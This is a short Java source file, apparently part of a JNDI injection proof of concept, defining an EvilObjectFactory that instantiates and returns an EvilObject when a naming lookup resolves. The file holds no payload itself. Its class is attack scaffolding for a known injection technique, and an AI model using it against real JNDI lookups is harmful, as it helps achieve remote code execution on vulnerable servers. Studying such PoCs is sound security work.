package org.lain.poc.jndi;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

/**
 * @author: ZH3FENG
 * @Date: 下午8:20 2017/12/11
 * @Modified By:
 * @Description: 工厂
 */
public class EvilObjectFactory implements ObjectFactory {


    /**
     * 生成Object 实例,简单地实例化一个对象，然后返回
     * @param obj
     * @param name
     * @param nameCtx
     * @param environment
     * @return
     * @throws Exception
     */
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {


        EvilObject evilObject = new EvilObject();

        return evilObject;
    }
}
